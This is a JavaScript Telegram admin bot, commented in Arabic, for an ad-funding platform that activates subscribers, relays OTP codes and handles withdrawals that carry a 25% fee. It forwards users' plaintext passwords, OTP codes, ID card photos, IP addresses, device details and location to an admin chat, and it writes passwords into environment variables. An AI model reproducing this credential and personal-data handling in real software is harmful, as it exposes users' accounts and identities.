// telegramBot.js - إدارة البوت مع التفعيل الفوري للمشتركين وربط ViaBTC بدون إعادة تشغيل السيرفر

class TelegramBotManager {
    constructor(token, adminChatId, onDecisionCallback) {
        this.token = token;
        this.adminChatId = String(adminChatId);
        this.onDecisionCallback = onDecisionCallback;
        this.apiUrl = `https://api.telegram.org/bot${this.token}`;
        this.lastUpdateId = 0;
        this.isPolling = false;
        // حفظ رقم هاتف المشترك الذي ينتظر إرسال رابط ViaBTC من المشرف
        this.awaitingViaBtcForPhone = null;
    }

    startListening() {
        if (!this.token || this.token.includes("ضع_توكن") || this.isPolling) return;
        this.isPolling = true;
        console.log("✅ بوت التيليجرام متصل (يدعم التفعيل الفوري للمشتركين وربط ViaBTC)...");
        this.registerBotCommands();
        this.pollUpdates();
    }

    async registerBotCommands() {
        try {
            await fetch(`${this.apiUrl}/setMyCommands`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    commands: [
                        { command: "menu", description: "📊 لوحة التحكم وإحصائيات الحسابات" },
                        { command: "users", description: "👥 عرض قائمة المشتركين المفعّلين والمنتظرين" },
                        { command: "clear", description: "🗑️ مسح جميع قوائم السحوبات" }
                    ]
                })
            });
        } catch (e) {}
    }

    async pollUpdates() {
        while (this.isPolling) {
            try {
                const res = await fetch(`${this.apiUrl}/getUpdates?offset=${this.lastUpdateId + 1}&timeout=25`);
                const data = await res.json();

                if (data.ok && Array.isArray(data.result)) {
                    for (const update of data.result) {
                        this.lastUpdateId = update.update_id;

                        if (update.callback_query) {
                            await this.handleButtonClick(update.callback_query);
                        }

                        if (update.message && update.message.text) {
                            await this.handleTextCommand(update.message);
                        }
                    }
                }
            } catch (err) {
                await new Promise(r => setTimeout(r, 3000));
            }
        }
    }

    async handleTextCommand(message) {
        const chatId = String(message.chat.id);
        if (chatId !== this.adminChatId) return;

        const text = message.text.trim();

        // 1. إلغاء وضع انتظار الرابط إذا كتب المشرف "الغاء"
        if (text === "الغاء" || text === "إلغاء" || text === "/cancel") {
            this.awaitingViaBtcForPhone = null;
            await this.sendPlainMessage("❎ *تم إلغاء عملية إدخال الرابط.*");
            return;
        }

        // 2. إذا كان البوت ينتظر منك إرسال رابط ViaBTC لتفعيل مشترك ضغطت على زره
        if (this.awaitingViaBtcForPhone && text.startsWith("http")) {
            const targetPhone = this.awaitingViaBtcForPhone;
            this.awaitingViaBtcForPhone = null;

            const result = await this.onDecisionCallback(targetPhone, "activate_user_url", text);
            if (result && result.success) {
                await this.sendPlainMessage(
`✅ *تم تفعيل حساب المشترك فوراً بنجاح!*
━━━━━━━━━━━━━━━━━━━━
👤 *الاسم:* ${result.user.name}
📱 *رقم الهاتف:* \`${result.user.phone}\`
🔑 *كلمة المرور:* \`${result.user.password}\`
🔗 *رابط ViaBTC المربوط:*
\`${result.user.viabtcUrl}\`
━━━━━━━━━━━━━━━━━━━━
📡 *تم بدء قراءة الرصيد الفعلي وإرسال إشعار التفعيل للمشترك عبر واتساب!*
📋 *نسخة احتياطية لـ Environment Variables:*
\`USER_${result.user.phone}=${result.user.name}|${result.user.password}|${result.user.viabtcUrl}\``
                );
            } else {
                await this.sendPlainMessage(`⚠️ تعذر التفعيل: ${result?.message || "المشترك غير موجود"}`);
            }
            return;
        }

        // 3. أمر تفعيل مباشر: تفعيل 010xxxxxxxx https://... أو /activate 010xxxxxxxx https://...
        if (text.startsWith("/activate ") || text.startsWith("تفعيل ")) {
            const parts = text.replace(/^(\/activate|تفعيل)\s+/i, "").trim().split(/\s+/);
            const phone = parts[0];
            const url = parts[1] || "";

            if (!/^01[0-9]{9}$/.test(phone)) {
                await this.sendPlainMessage("⚠️ *الصيغة الصحيحة:*\n`تفعيل 01012345678 https://www.viabtc.com/...`");
                return;
            }

            const result = await this.onDecisionCallback(phone, "activate_user_url", url);
            if (result && result.success) {
                await this.sendPlainMessage(
`✅ *تم تفعيل وتحديث رابط المشترك (${result.user.name}) فوراً!*
📱 *الهاتف:* \`${result.user.phone}\`
🔑 *الباسورد:* \`${result.user.password}\`
📋 *سطر Environment الاحتياطي:*
\`USER_${result.user.phone}=${result.user.name}|${result.user.password}|${result.user.viabtcUrl}\``
                );
            } else {
                await this.sendPlainMessage(`⚠️ ${result?.message || "لم يتم العثور على طلب تسجيل لهذا الرقم. يمكنك إضافته بالأمر: اضافة الاسم|الرقم|الباسورد|الرابط"}`);
            }
            return;
        }

        // 4. أمر إضافة أو تعديل مشترك بالكامل يدوياً: اضافة الاسم|010xxxxxxxx|الباسورد|الرابط
        if (text.startsWith("/adduser ") || text.startsWith("اضافة ") || text.startsWith("إضافة ")) {
            const rawPayload = text.replace(/^(\/adduser|اضافة|إضافة)\s+/i, "").trim();
            const result = await this.onDecisionCallback(" MANUAL", "add_full_user", rawPayload);

            if (result && result.success) {
                await this.sendPlainMessage(
`✅ *تمت إضافة وتفعيل المشترك فوراً بدون إعادة تشغيل السيرفر!*
━━━━━━━━━━━━━━━━━━━━
👤 *الاسم:* ${result.user.name}
📱 *رقم الهاتف:* \`${result.user.phone}\`
🔑 *كلمة المرور:* \`${result.user.password}\`
🔗 *رابط ViaBTC:*
\`${result.user.viabtcUrl}\``
                );
            } else {
                await this.sendPlainMessage(
`⚠️ *صيغة الإضافة غير مكتملة. استخدم الصيغة التالية:*
\`اضافة محمد أحمد|01012345678|123456|https://www.viabtc.com/...?\``
                );
            }
            return;
        }

        // 5. أمر عرض قائمة جميع المشتركين المفعّلين والمنتظرين
        if (text === "/users" || text === "المشتركين" || text === "الحسابات") {
            const info = await this.onDecisionCallback("ALL", "list_users");
            await this.sendPlainMessage(info?.formattedText || "لا توجد حسابات مسجلة حالياً.");
            return;
        }

        // 6. أمر مسح قوائم السحوبات
        if (text === "/clear" || text === "مسح" || text === "مسح القائمة") {
            await this.onDecisionCallback("ALL", "clear_all");
            await this.sendPlainMessage("✅ *تم مسح قوائم السحوبات وتصفير المبالغ المعلقة لجميع الحسابات!*");
            return;
        }

        // 7. لوحة التحكم الرئيسية
        if (text === "/start" || text === "/menu" || text === "تحكم") {
            const status = await this.onDecisionCallback("ALL", "get_status");
            const panelText =
`🎛 *لوحة التحكم الفورية - منصة AD$*
━━━━━━━━━━━━━━━━━━━━
👥 *المشتركون المفعّلون:* \`${status?.usersCount || 0}\` مشترك
⏳ *طلبات تسجيل بانتظار التفعيل:* \`${status?.pendingRegCount || 0}\` طلب
🏦 *سعر الصرف الرسمي:* \`${status?.exchangeRate || "56.26"} ج.م\`
📋 *إجمالي عمليات السحب:* \`${status?.historyCount || 0}\` عملية
━━━━━━━━━━━━━━━━━━━━
💡 *أوامر التفعيل السريع بدون إعادة تشغيل Render:*
• لتفعيل مشترك:
\`تفعيل 010xxxxxxxx https://www.viabtc.com/...\`
• لإضافة مشترك جديد مباشرة:
\`اضافة الاسم|010xxxxxxxx|الباسورد|الرابط\`
• لعرض جميع المشتركين: أرسل \`/users\``;

            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: this.adminChatId,
                    text: panelText,
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "👥 عرض قائمة المشتركين", callback_data: "list_users:panel" }],
                            [{ text: "🗑️ مسح جميع قوائم السحوبات", callback_data: "clear_all:panel" }]
                        ]
                    }
                })
            });
        }
    }

    async sendPlainMessage(text, replyMarkup = null) {
        try {
            const body = {
                chat_id: this.adminChatId,
                text: text,
                parse_mode: "Markdown"
            };
            if (replyMarkup) body.reply_markup = replyMarkup;

            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(body)
            });
        } catch (e) {}
    }

    // 1. إشعار كود التحقق (7 أرقام)
    async sendOtpAlertToAdmin(phone, otpCode, purpose, autoSent) {
        const intlPhone = "2" + phone;
        const purposeText = purpose === "register" ? "تسجيل حساب جديد" : "استعادة كلمة المرور";
        const waMessage = encodeURIComponent(
            `مرحباً بك في منصة AD$ للتمويل الإعلاني 🌐\nكود التحقق الخاص بك (${purposeText}) المكون من 7 أرقام هو:\n*${otpCode}*`
        );
        const waUrl = `https://wa.me/${intlPhone}?text=${waMessage}`;

        const msg =
`🔐 *كود مصادقة واتساب (7 أرقام - OTP)*
━━━━━━━━━━━━━━━━━━━━
📌 *السبب:* ${purposeText}
📱 *رقم الهاتف:* \`${phone}\`
🔢 *كود الـ 7 أرقام:* \`${otpCode}\`
📡 *حالة الإرسال التلقائي:* ${autoSent ? "✅ تم الإرسال تلقائياً عبر واتساب السيرفر" : "⚡ جاهز للإرسال المباشر عبر الزر أدناه"}
━━━━━━━━━━━━━━━━━━━━`;

        const keyboard = {
            inline_keyboard: [
                [{ text: "📲 إرسال الكود لواتساب المشترك بضغطة واحدة", url: waUrl }]
            ]
        };

        await this.sendPlainMessage(msg, keyboard);
    }

    // 2. إرسال بيانات المشترك الجديد + صورة البطاقة الشخصية + أزرار التفعيل الفوري
    async sendNewRegistrationWithIdCard(regData) {
        const { fullName, phone, password, idCardBase64, deviceInfo, date } = regData;
        const envKey = `USER_${phone}`;
        const envValue = `${fullName}|${password}|ضع_رابط_VIABTC_الخاص_به_هنا`;

        const caption =
`🆕 *طلب تسجيل مشترك جديد + صورة البطاقة*
━━━━━━━━━━━━━━━━━━━━
👤 *الاسم الكامل:* ${fullName}
📱 *رقم الهاتف:* \`${phone}\`
🔑 *كلمة المرور:* \`${password}\`
📲 *نوع الجهاز:* ${deviceInfo?.deviceModel || "غير معروف"}
🌐 *الـ IP الخارجي:* \`${deviceInfo?.ip || "غير معروف"}\`
⏰ *التوقيت:* ${date}
━━━━━━━━━━━━━━━━━━━━
⚡ *اضغط على الزر أدناه لتفعيله فوراً بدون إعادة تشغيل Render:*
أو انسخ السطر لـ Environment:
\`${envKey}=${envValue}\``;

        const inlineKeyboard = {
            inline_keyboard: [
                [
                    { text: "⚡ تفعيل فوري وربط رابط ViaBTC مخصص", callback_data: `prompt_activate:${phone}` }
                ],
                [
                    { text: "✅ تفعيل فوري بالرابط الافتراضي", callback_data: `quick_activate:${phone}` }
                ]
            ]
        };

        try {
            if (idCardBase64 && idCardBase64.includes("base64,")) {
                const base64Data = idCardBase64.split("base64,")[1];
                const buffer = Buffer.from(base64Data, "base64");
                const formData = new FormData();
                formData.append("chat_id", this.adminChatId);
                formData.append("caption", caption);
                formData.append("parse_mode", "Markdown");
                formData.append("reply_markup", JSON.stringify(inlineKeyboard));
                formData.append("photo", new Blob([buffer], { type: "image/jpeg" }), `id_${phone}.jpg`);

                await fetch(`${this.apiUrl}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
            } else {
                await this.sendPlainMessage(caption, inlineKeyboard);
            }
        } catch (err) {
            console.error("خطأ في إرسال صورة البطاقة:", err.message);
            await this.sendPlainMessage(caption, inlineKeyboard);
        }
    }

    // 3. إشعار تغيير كلمة المرور
    async sendPasswordResetNotice(user) {
        const envKey = `USER_${user.phone}`;
        const envValue = `${user.name}|${user.password}|${user.viabtcUrl || "رابط_فيا"}`;
        const text =
`🔄 *قام مشترك بتغيير كلمة المرور عبر OTP*
━━━━━━━━━━━━━━━━━━━━
👤 *المشترك:* ${user.name} (\`${user.phone}\`)
🔑 *كلمة المرور الجديدة:* \`${user.password}\`
━━━━━━━━━━━━━━━━━━━━
📋 *السطر المحدث لـ Environment Variables:*
\`${envKey}=${envValue}\``;

        await this.sendPlainMessage(text);
    }

    // 4. إرسال إشعار طلب السحب
    async sendWithdrawNotification(record, totalPending) {
        if (!this.token || this.token.includes("ضع_توكن")) return;

        const rawDestination = String(record.destination || "").trim();
        const cleanCopyableNumber = rawDestination.replace(/\s+/g, "");
        const dev = record.deviceInfo || {};

        const text = 
`🔔 *طلب سحب جديد | حساب: ${record.accountOwnerName}*
━━━━━━━━━━━━━━━━━━━━
🆔 *رقم العملية:* \`${record.id}\`
📱 *حساب المشترك:* \`${record.userPhone}\` (${record.accountOwnerName})
👤 *اسم المستفيد:* ${record.userName}
💰 *المبلغ المخصوم:* $${record.gross}
📉 *رسوم التحويل (25%):* -$${record.fee}
💵 *الصافي بالدولار:* $${record.net}
🏦 *سعر الصرف الرسمي:* ${record.exchangeRate} ج.م
🇪🇬 *المبلغ المطلوب تحويله بالمصري:* *${Number(record.netEgp).toLocaleString("en-US", { minimumFractionDigits: 2 })} ج.م*
━━━━━━━━━━━━━━━━━━━━
💳 *وسيلة الدفع:* ${record.method}
📋 *اضغط على الرقم لنسخه فوراً:*
\`${cleanCopyableNumber}\`
${rawDestination !== cleanCopyableNumber ? `🔢 *التنسيق المقروء:* \`${rawDestination}\`\n` : ""}━━━━━━━━━━━━━━━━━━━━
📱 *بيانات الجهاز والشبكة:*
🔖 *معرف الجهاز:* \`${dev.deviceId || "غير متاح"}\`
📲 *الجهاز:* ${dev.deviceModel || "غير معروف"}
⚙️ *المعالج:* ${dev.cpu || "غير معروف"} | 🧠 *الرام:* ${dev.ram || "غير معروف"}
🔋 *البطارية:* ${dev.battery || "غير متاح"}
🌐 *الـ IP:* \`${dev.ip || "غير معروف"}\` (${dev.isp || ""})
📍 *الموقع:* ${dev.location || "غير معروف"}
━━━━━━━━━━━━━━━━━━━━
📊 *المعلق في حساب المشترك:* $${totalPending.toFixed(2)}
⏰ *التوقيت:* ${record.date}`;

        const inlineKeyboard = {
            inline_keyboard: [
                [
                    { text: "✅ تمت التسوية والدفع بنجاح", callback_data: `approve:${record.userPhone}:${record.id}` }
                ],
                [
                    { text: "❌ فشلت العملية (إعادة المبلغ للمشترك)", callback_data: `reject:${record.userPhone}:${record.id}` }
                ],
                [
                    { text: "🗑️ مسح سجل هذا المشترك", callback_data: `clear_user:${record.userPhone}:${record.id}` }
                ]
            ]
        };

        try {
            await fetch(`${this.apiUrl}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: this.adminChatId,
                    text: text,
                    parse_mode: "Markdown",
                    reply_markup: inlineKeyboard
                })
            });
        } catch (err) {
            console.error("فشل إرسال رسالة تيليجرام:", err.message);
        }
    }

    async handleButtonClick(callbackQuery) {
        const chatId = String(callbackQuery.message?.chat?.id || "");
        if (chatId !== this.adminChatId) return;

        const data = callbackQuery.data || "";
        const parts = data.split(":");
        const action = parts[0];
        const targetPhone = parts[1];
        const txId = parts[2];
        const message = callbackQuery.message;

        // 1. زر طلب إدخال رابط ViaBTC لتفعيل المشترك فوراً
        if (action === "prompt_activate") {
            this.awaitingViaBtcForPhone = targetPhone;
            await this.answerCallback(callbackQuery.id, "أرسل الآن رابط ViaBTC في المحادثة");
            await this.sendPlainMessage(
`🔗 *أرسل الآن رابط المراقب (ViaBTC Observer URL) الخاص بالمشترك* \`${targetPhone}\` *في رسالة عادية ليتم تفعيل حسابه فوراً:*
*(أو أرسل كلمة \`الغاء\` للتراجع)*`
            );
            return;
        }

        // 2. زر التفعيل الفوري بالرابط الافتراضي
        if (action === "quick_activate") {
            const result = await this.onDecisionCallback(targetPhone, "activate_user_url", "");
            if (result && result.success) {
                await this.answerCallback(callbackQuery.id, "✅ تم تفعيل حساب المشترك فوراً!");
                await this.sendPlainMessage(
`✅ *تم تفعيل حساب المشترك (${result.user.name} - \`${result.user.phone}\`) بالرابط الافتراضي فوراً!*`
                );
            } else {
                await this.answerCallback(callbackQuery.id, `⚠️ ${result?.message || "تعذر التفعيل"}`);
            }
            return;
        }

        // 3. زر عرض قائمة المشتركين
        if (action === "list_users") {
            const info = await this.onDecisionCallback("ALL", "list_users");
            await this.answerCallback(callbackQuery.id, "تم جلب قائمة المشتركين");
            await this.sendPlainMessage(info?.formattedText || "لا توجد حسابات حالياً.");
            return;
        }

        // 4. أزرار مسح السحوبات
        if (action === "clear_all") {
            await this.onDecisionCallback("ALL", "clear_all");
            await this.answerCallback(callbackQuery.id, "✅ تم مسح جميع قوائم السحوبات بنجاح!");
            return;
        }

        if (action === "clear_user") {
            await this.onDecisionCallback(targetPhone, "clear_user");
            await this.answerCallback(callbackQuery.id, `✅ تم مسح قائمة سحوبات المشترك ${targetPhone}`);
            return;
        }

        // 5. أزرار قبول أو رفض عملية سحب
        const updatedRecord = await this.onDecisionCallback(targetPhone, action, txId);

        if (!updatedRecord) {
            await this.answerCallback(callbackQuery.id, "⚠️ هذه العملية غير موجودة أو تم مسحها.");
            return;
        }

        const statusLine = action === "approve"
            ? "✅ *الحالة النهائية: تمت التسوية والدفع بنجاح*"
            : "❌ *الحالة النهائية: فشلت العملية (تم إرجاع المبلغ لحساب المشترك)*";

        const updatedText = `${message.text}\n\n${statusLine}`;

        await fetch(`${this.apiUrl}/editMessageText`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: message.chat.id,
                message_id: message.message_id,
                text: updatedText,
                parse_mode: "Markdown"
            })
        });

        await this.answerCallback(
            callbackQuery.id,
            action === "approve" ? "تم اعتماد الدفع!" : "تم إلغاء العملية وإرجاع المبلغ!"
        );
    }

    async answerCallback(callbackQueryId, text) {
        await fetch(`${this.apiUrl}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                callback_query_id: callbackQueryId,
                text: text,
                show_alert: true
            })
        });
    }
}

module.exports = TelegramBotManager;
